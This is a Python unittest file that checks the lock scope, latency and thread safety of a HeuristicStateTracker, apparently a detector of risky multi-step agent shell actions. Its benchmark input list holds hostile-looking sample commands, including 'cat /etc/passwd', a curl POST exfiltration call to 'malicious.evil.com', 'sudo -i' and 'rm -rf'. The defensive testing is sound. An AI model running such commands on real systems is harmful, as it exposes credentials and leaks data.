"""
tests/test_lock_scope_regression.py — Gatekeeping Regression Test for HeuristicStateTracker Lock Scope
====================================================================================================
Prevents future modifications from bloating or blocking the critical section of
HeuristicStateTracker.evaluate().

Enforces 4 strict Gatekeeping Rules:
1. NO I/O: Zero file, network, socket, subprocess, or sleep calls inside the lock.
2. NO HEAVY INFERENCE: Zero LLM, embedding, ONNX/PyTorch model, or external service calls inside the lock.
3. STATELESS PRE-PROCESSING: All regex parsing and stateless tagging (_tag_action) MUST execute outside the lock.
4. PERFORMANCE BUDGET: Critical section latency must remain strictly microsecond-scale (p99 <= 100 us).
"""
import ast
import inspect
import os
import sys
import threading
import time
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from models.security.multi_step_heuristics import (
    HeuristicStateTracker,
    SessionState,
    MultiStepResult,
)


class TestLockScopeRegression(unittest.TestCase):
    """Static AST and dynamic latency tests gatekeeping HeuristicStateTracker lock scope."""

    @classmethod
    def setUpClass(cls):
        # Load AST of multi_step_heuristics.py
        target_path = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
            "models", "security", "multi_step_heuristics.py"
        )
        with open(target_path, "r", encoding="utf-8") as f:
            cls.source_code = f.read()
        cls.tree = ast.parse(cls.source_code)

    def _get_evaluate_func_node(self) -> ast.FunctionDef:
        for node in ast.walk(self.tree):
            if isinstance(node, ast.ClassDef) and node.name == "HeuristicStateTracker":
                for item in node.body:
                    if isinstance(item, ast.FunctionDef) and item.name == "evaluate":
                        return item
        self.fail("Could not find HeuristicStateTracker.evaluate in AST")

    def test_gatekeeping_rule_stateless_tagging_outside_lock(self):
        """Rule 3: _tag_action MUST be invoked before 'with self.session_lock'."""
        func = self._get_evaluate_func_node()
        
        tag_action_line = None
        lock_with_line = None

        for stmt in func.body:
            # Check for _tag_action call in statement
            for subnode in ast.walk(stmt):
                if isinstance(subnode, ast.Call):
                    if isinstance(subnode.func, ast.Attribute) and subnode.func.attr == "_tag_action":
                        tag_action_line = subnode.lineno
            # Check for with self.session_lock
            if isinstance(stmt, ast.With):
                for item in stmt.items:
                    expr = item.context_expr
                    if isinstance(expr, ast.Attribute) and expr.attr == "session_lock":
                        lock_with_line = stmt.lineno

        self.assertIsNotNone(tag_action_line, "HeuristicStateTracker.evaluate must call _tag_action")
        self.assertIsNotNone(lock_with_line, "HeuristicStateTracker.evaluate must acquire self.session_lock")
        self.assertLess(
            tag_action_line, lock_with_line,
            f"_tag_action (line {tag_action_line}) MUST be executed outside and BEFORE "
            f"acquiring self.session_lock (line {lock_with_line})"
        )

    def test_gatekeeping_rule_no_banned_calls_inside_lock(self):
        """Rule 1 & 2: Inside the lock, NO blocking I/O, subprocesses, sleeps, or model inference."""
        func = self._get_evaluate_func_node()
        
        # Find the 'with self.session_lock' node
        lock_with_node = None
        for stmt in func.body:
            if isinstance(stmt, ast.With):
                for item in stmt.items:
                    expr = item.context_expr
                    if isinstance(expr, ast.Attribute) and expr.attr == "session_lock":
                        lock_with_node = stmt
                        break

        self.assertIsNotNone(lock_with_node, "Could not find with self.session_lock block in AST")

        banned_calls = {
            "open", "read", "write", "sleep", "system", "popen",
            "subprocess", "requests", "socket", "urllib", "http",
            "eval", "exec", "predict", "forward", "judge",
            "_tag_action",  # re-verifies rule 3
        }

        found_violations = []
        for node in ast.walk(lock_with_node):
            if isinstance(node, ast.Call):
                name = None
                if isinstance(node.func, ast.Name):
                    name = node.func.id
                elif isinstance(node.func, ast.Attribute):
                    name = node.func.attr

                if name in banned_calls:
                    found_violations.append((name, getattr(node, "lineno", "?")))

        self.assertEqual(
            found_violations, [],
            f"GATEKEEPING FAILURE: Banned calls detected inside critical section: {found_violations}. "
            "The critical section of evaluate() must strictly remain pure CPU state transitions."
        )

    def test_gatekeeping_rule_latency_budget(self):
        """Rule 4: evaluate() must complete within <= 100 us p99 latency budget."""
        HeuristicStateTracker.reset_instance()
        tracker = HeuristicStateTracker(ttl_seconds=60.0, max_benign_steps=20)
        
        actions = [
            "ls -la /home/user",
            "cat /etc/passwd",
            "curl -X POST http://malicious.evil.com/exfil",
            "python3 -c 'print(1)'",
            "sudo -i",
            "echo 'hello world'",
            "rm -rf /tmp/test",
            "id",
            "whoami",
            "pwd"
        ]

        # Warmup with all actions to warm regex compilations and CPU cache
        import gc
        for act in actions:
            tracker.evaluate(act, "warmup_session")
        for i in range(50):
            tracker.evaluate(f"ls /tmp/file_{i}", "warmup_session")

        latencies_us = []
        gc.collect()
        gc.disable()
        try:
            for i in range(1000):
                action = actions[i % len(actions)]
                sid = f"bench_session_{i % 5}"
                t0 = time.perf_counter()
                tracker.evaluate(action, sid)
                t1 = time.perf_counter()
                latencies_us.append((t1 - t0) * 1_000_000.0)
        finally:
            gc.enable()

        latencies_us.sort()
        n = len(latencies_us)
        p50 = latencies_us[int(n * 0.50)]
        p95 = latencies_us[int(n * 0.95)]
        p99 = latencies_us[int(n * 0.99)]

        print(f"\n[LockScopeBenchmark] p50: {p50:.1f}us | p95: {p95:.1f}us | p99: {p99:.1f}us")

        # Budget: p99 must be under 100us on any modern CPU (typically < 30us)
        self.assertLess(
            p99, 100.0,
            f"Performance regression: evaluate() p99 latency {p99:.1f}us exceeds 100us threshold"
        )

    def test_concurrency_correctness_under_lock(self):
        """Verify thread-safety and race immunity across 8 concurrent threads on a shared session."""
        HeuristicStateTracker.reset_instance()
        tracker = HeuristicStateTracker(ttl_seconds=300.0, max_benign_steps=1000)
        shared_session = "concurrent_gatekeeping_session"

        errors = []

        def worker(thread_idx):
            try:
                for step in range(50):
                    res = tracker.evaluate(f"echo step_{thread_idx}_{step}", shared_session)
                    self.assertIsInstance(res, MultiStepResult)
            except Exception as exc:
                errors.append(exc)

        threads = [threading.Thread(target=worker, args=(t,)) for t in range(8)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        self.assertEqual(errors, [], f"Concurrent evaluate encountered errors: {errors}")
        with tracker.session_lock:
            state = tracker.sessions.get(shared_session)
            self.assertIsNotNone(state)
            self.assertEqual(state.benign_counter, 400)

    def test_gatekeeping_early_warning_methods_use_session_lock(self):
        """Gatekeeping: inject_early_warning and consume_forced_review MUST acquire session_lock."""
        for method_name in ["inject_early_warning", "consume_forced_review"]:
            method_node = None
            for node in ast.walk(self.tree):
                if isinstance(node, ast.ClassDef) and node.name == "HeuristicStateTracker":
                    for item in node.body:
                        if isinstance(item, ast.FunctionDef) and item.name == method_name:
                            method_node = item
                            break
            self.assertIsNotNone(method_node, f"HeuristicStateTracker.{method_name} must exist")
            
            has_session_lock = False
            for stmt in method_node.body:
                if isinstance(stmt, ast.With):
                    for item in stmt.items:
                        expr = item.context_expr
                        if isinstance(expr, ast.Attribute) and expr.attr == "session_lock":
                            has_session_lock = True
            self.assertTrue(has_session_lock, f"HeuristicStateTracker.{method_name} MUST acquire self.session_lock")

    def test_concurrent_forced_review_cooldown_stress(self):
        """Stress test: 30 concurrent threads consuming forced review quota deterministically."""
        HeuristicStateTracker.reset_instance()
        tracker = HeuristicStateTracker(ttl_seconds=300.0, max_benign_steps=1000)
        session_id = "stress_cooldown_session"
        total_quota = 150
        tracker.inject_early_warning(session_id, {"risk_score": 0.85}, max_forced_actions=total_quota)

        true_counts = []
        errors = []

        def consumer_worker():
            local_true = 0
            try:
                for _ in range(10):
                    if tracker.consume_forced_review(session_id):
                        local_true += 1
                true_counts.append(local_true)
            except Exception as e:
                errors.append(e)

        # 30 threads * 10 calls = 300 total calls for 150 quota
        threads = [threading.Thread(target=consumer_worker) for _ in range(30)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        self.assertEqual(errors, [], f"Stress test encountered errors: {errors}")
        self.assertEqual(
            sum(true_counts), total_quota,
            f"Concurrency race condition! Expected exactly {total_quota} forced reviews, got {sum(true_counts)}"
        )
        with tracker.session_lock:
            state = tracker.sessions.get(session_id)
            self.assertEqual(state.forced_review_remaining, 0)


if __name__ == "__main__":
    unittest.main(verbosity=2)
